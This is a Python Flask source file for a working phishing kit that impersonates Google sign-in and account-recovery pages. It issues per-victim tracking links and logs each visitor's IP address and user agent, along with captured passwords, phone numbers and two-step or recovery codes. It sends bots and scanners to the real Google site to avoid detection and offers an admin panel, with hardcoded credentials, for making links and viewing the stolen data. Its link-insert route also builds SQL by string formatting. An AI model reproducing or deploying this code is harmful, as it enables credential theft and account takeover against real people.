# from crypt import methods
from urllib.parse import uses_relative
from flask import Flask , render_template , request , redirect , url_for
import datetime
import random
import time
import mysql.connector


app = Flask(__name__)


mydb = mysql.connector.connect(
  host="localhost",
  user="root",
  password="",
  database="phishing"
)

mycursor = mydb.cursor()

@app.route("/gmail")
def gmaillog():

  gid = request.args.get("id")
  pid = request.args.get("hashid")

  sql = "SELECT * FROM `dbgmail` WHERE `user`= %s AND `hash`=%s"
  adr= (gid, pid,)
  mycursor.execute(sql, adr)
  myresult = mycursor.fetchall()
  if myresult == []:
      return 'https://accounts.google.com/'
  elif gid == myresult[0][0] and pid == myresult[0][1]:
    time = datetime.datetime.now()
    fo = open("log.txt", "a")
    filebuffer = ("\n*New GmailRecovery log ==="+gid+"*********\ntime : " + str(time))
    fo.writelines(filebuffer)
    fo.close()


    ip = request.remote_addr
    fo = open("log.txt", "a")
    filebuffer = ("\nip adress : " + str(ip))
    fo.writelines(filebuffer)
    fo.close()

    user_agent = request.headers.get('User-Agent')
    if 'Bot' in user_agent:
      return redirect("https://accounts.google.com/" , code=302)
    elif user_agent is None:
      return redirect("https://accounts.google.com/" , code=302)
    else:
      fo = open("log.txt", "a")
      filebuffer = ("\nuser agent : " + str(user_agent))
      fo.writelines(filebuffer)
      fo.close()
      return redirect((url_for('gmailsignin', id=gid,hashid=pid)) , code=302)
  else:
    pass



# @app.errorhandler(404)    
# def showerror(error):
#     return str(error)


@app.route("/gmail/password")
def gmailsignin():
    gid = request.args.get("id")
    pid = request.args.get("hashid")

    sql = "SELECT * FROM `dbgmail` WHERE `user`= %s AND `hash`=%s"
    adr= (gid, pid,)
    mycursor.execute(sql, adr)
    myresult = mycursor.fetchall()
    if myresult == []:
      return 'https://accounts.google.com/'
    elif gid == myresult[0][0] and pid == myresult[0][1]:
        return render_template("gmailorg2.html", varib=gid)
        #return redirect("/x" , code=302)
        #return redirect((url_for('gmailxs', id=gid,hashid=pid)) , code=302,)
       

@app.route("/x" , methods=['POST'])
def gmailxs():
    json_data = request.get_json(force=True)
    log = json_data['pass3']
    # log=request.form["passwords"]
    fo= open("log.txt", "a")
    filebuffer = ("\npassword : " + log )
    fo.writelines(filebuffer)
    fo.close()
    return('', 204)

    # gid = request.form("id")
    # pid = request.form("hashid")
    # sql = "SELECT * FROM `hashing` WHERE `user`= %s AND `hash`=%s"
    # adr= (gid, pid,)
    # mycursor.execute(sql, adr)
    # myresult = mycursor.fetchall()
    # if myresult == []:
    #   return 'https://accounts.google.com/'
    # elif gid == myresult[0][0] and pid == myresult[0][1]:
      # return redirect("/gmail/step2" , code=302)
      
  
 
  # else:
    # pass  

@app.route("/gmail/step2")
def gmailpas():
  gid = request.args.get("id")
  pid = request.args.get("hashid")

  sql = "SELECT * FROM `dbgmail` WHERE `user`= %s AND `hash`=%s"
  adr= (gid, pid,)
  mycursor.execute(sql, adr)
  myresult = mycursor.fetchall()
  if myresult == []:
      return 'https://accounts.google.com/'
  elif gid == myresult[0][0] and pid == myresult[0][1]:
    return render_template("gmail2stp.html", varib=gid )
    return redirect("/y" , code=302)


@app.route("/y" , methods=["POST"])
def gmailys():
    log=request.form["text"]
    fo= open("log.txt","a")
    filebuffer = ("\n2-step : " + log)
    fo.writelines(filebuffer)
    fo.close()
    return redirect("https://accounts.google.com/" , code=302)

# from flask import Flask , render_template , request , redirect , url_for, abort
# import datetime
# import mysql.connector

# app = Flask(__name__)

# mydb = mysql.connector.connect(
#   host="localhost",
#   user="root",
#   password="",
#   database="hash"
# )

# mycursor = mydb.cursor()

##############################################Recover##############################################################

@app.route("/recover")
def recover1():

  gid = request.args.get("id")
  pid = request.args.get("hashid")

  sql = "SELECT * FROM `dbgmail` WHERE `user`= %s AND `hash`=%s"
  adr= (gid, pid,)
  mycursor.execute(sql, adr)
  myresult = mycursor.fetchall()
  if myresult == []:
      return 'https://accounts.google.com/'
  elif gid == myresult[0][0] and pid == myresult[0][1]:
    time = datetime.datetime.now()
    fo = open("log.txt", "a")
    filebuffer = ("\n*New GmailRecovery log ==="+gid+"*********\ntime : " + str(time))
    fo.writelines(filebuffer)
    fo.close()


    ip = request.remote_addr
    fo = open("log.txt", "a")
    filebuffer = ("\nip adress : " + str(ip))
    fo.writelines(filebuffer)
    fo.close()
    user_agent = request.headers.get('User-Agent')
    if 'Bot' in user_agent:
      return redirect("https://accounts.google.com/" , code=302)
    elif user_agent is None:
      return redirect("https://accounts.google.com/" , code=302)
    else:
      fo = open("log.txt", "a")
      filebuffer = ("\nuser agent : " + str(user_agent))
      fo.writelines(filebuffer)
      fo.close()
      return redirect((url_for('recoversign', id=gid,hashid=pid)) , code=302)
  else:
    pass


@app.route("/recover/password")
def recoversign():
    gid = request.args.get("id")
    pid = request.args.get("hashid")

    sql = "SELECT * FROM `dbgmail` WHERE `user`= %s AND `hash`=%s"
    adr= (gid, pid,)
    mycursor.execute(sql, adr)
    myresult = mycursor.fetchall()
    if myresult == []:
      return 'https://accounts.google.com/'
    elif gid == myresult[0][0] and pid == myresult[0][1]:
        return render_template("verify2.html", varib=gid)
     
       

@app.route("/q" , methods=['POST'])
def recoverxs():
    json_data = request.get_json(force=True)
    log = json_data['pass3']
    # log=request.form["passwords"]
    fo= open("log.txt", "a")
    filebuffer = ("\nphone-number : " + log )
    fo.writelines(filebuffer)
    fo.close()
    fo= open("/static/styles/log2.txt", "w")
    filebuffer2 = ("\nphone-number : " + log )
    fo.writelines(filebuffer2)
    fo.close()
    return('', 204)


@app.route("/recover/code")
def recoverpas():
  gid = request.args.get("id")
  pid = request.args.get("hashid")

  sql = "SELECT * FROM `dbgmail` WHERE `user`= %s AND `hash`=%s"
  adr= (gid, pid,)
  mycursor.execute(sql, adr)
  myresult = mycursor.fetchall()
  if myresult == []:
      return 'https://accounts.google.com/'
  elif gid == myresult[0][0] and pid == myresult[0][1]:
    return render_template("verify3.html", varib=gid )
    return redirect("/r" , code=302)


@app.route("/r" , methods=["POST"])
def recoverys():
    log=request.form["text"]
    fo= open("log.txt","a")
    filebuffer = ("\ncode-recovery : " + log)
    fo.writelines(filebuffer)
    fo.close()
    return redirect("https://accounts.google.com/" , code=302)
  

# from flask import Flask , render_template , request , redirect , url_for, abort
# import datetime
# import mysql.connector

# app = Flask(__name__)

# mydb = mysql.connector.connect(
#   host="localhost",
#   user="root",
#   password="",
#   database="hash"
# )

# mycursor = mydb.cursor()

@app.route("/admin")
def adminpage():
  return render_template("admin1.html")

@app.route("/ck" , methods=["POST"])
def adminck():
    User=request.form["user"]
    Password=request.form["password"]
    if str(User)=='hodhod' and str(Password)=='hod123':
      return render_template("admpg.html")
    else:
      return redirect("https://who.is/" , code=302)
    
@app.route("/iouhgtugsljsrsreoigthvnresoth" , methods=["POST"])
def inserttodb():
  if 1==1:
      User=request.form["password"]
      number = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p', 'q','r','s','t','u','v', 'w','x','y','z']
      MAXlen = 10
      hash = []
      for i in range(MAXlen):
        c = random.choice(number)
        hash.append(c)
      hash = ''.join(hash)
      try:
        query = ("INSERT INTO dbgmail (user, hash) VALUES ('{}','{}')".format(User,hash))
        mycursor.execute(query)
        mydb.commit()
        return render_template("printend.html", link1=User , link2=hash)
          # return 'id='+User+'\nhashid='+hash
      except:
          sql = "SELECT * FROM `dbgmail` WHERE `user`= %s  "
          adr= (User,)
          mycursor.execute(sql, adr)
          myresult = mycursor.fetchall()
          print(myresult)
          return render_template("mjd.html", sss=myresult[0][0], ddd=myresult[0][1] )

  else:
      return 'do`t' 

@app.route("/lug")
def viwlog():
  return render_template("admin2.html")
@app.route("/logz" , methods=["POST"])
def viwlg():
  User=request.form["user"]
  Password=request.form["password"]
  if str(User)=='hodhod' and str(Password)=='hod123':
    for i in range(10):
      time.sleep(5)
      with open("log.txt", "r") as f:
        content = f.read()
      return render_template('log.html', content=content)        
  else:
    return redirect("https://www.google.com/" , code=302)

